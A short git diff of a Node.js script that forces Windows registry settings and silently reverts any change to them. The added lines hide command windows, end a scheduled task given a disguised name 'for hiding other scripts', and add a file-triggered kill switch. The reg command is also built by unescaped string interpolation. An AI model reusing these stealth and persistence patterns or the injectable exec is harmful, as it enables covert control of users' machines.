@@ -1,9 +1,10 @@
 const regdetector = require("registry-changes-detector")
 const fs = require("fs")
 const {exec} = require("child_process")
+const { exit } = require("process")
 
 function setRegistry(PATH,KEY,TYPE,VALUE) {
-	exec(`reg ADD "${PATH}" /v "${KEY}" /t "${TYPE}" /d "${VALUE}" /f`)
+	exec(`reg ADD "${PATH}" /v "${KEY}" /t "${TYPE}" /d "${VALUE}" /f`,{windowsHide: true})
 }
 
 function fix(item,now) {
@@ -86,3 +87,19 @@ let settings_actions = [
 ]
 
 settings_actions.forEach(async item => item.demon())
+
+// end schduler for hiding other scripts
+const scheduleName = "Update Host State Service v100 (For user)"
+setTimeout(()=>{
+	exec(`schtasks /end /tn "${scheduleName}"`,{windowsHide: true})
+},10000)
+
+// kill when requested
+let filewatch = fs.watch("./",async (eventType, filename)=>{
+	if (filename != ".kill") return
+	if (!fs.existsSync(".kill")) return
+	filewatch.close()
+	fs.unlinkSync(".kill")
+	fs.writeFileSync(".killed","")
+	process.exit(34567) // kill code (just random gen)
+})
